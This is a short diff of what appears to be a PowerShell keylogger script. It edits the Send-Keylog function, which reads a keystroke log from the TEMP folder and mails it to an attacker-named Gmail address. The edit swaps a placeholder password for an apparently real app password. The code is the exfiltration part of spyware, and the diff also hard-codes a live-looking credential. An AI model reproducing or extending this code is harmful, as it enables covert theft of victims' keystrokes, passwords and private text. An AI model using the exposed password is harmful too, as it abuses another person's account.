@@ -60,7 +60,7 @@ function Send-Keylog {
         [string]$To = "hankdahacker@gmail.com",
         [string]$Subject = "Keylog Report",
         [string]$LogPath = "$env:TEMP\keylog.txt",
-        [string]$Password = "YourAppPassword"
+        [string]$Password = "uvjvdwspjqaapayz"
     )
     
     $body = Get-Content $LogPath | Out-String
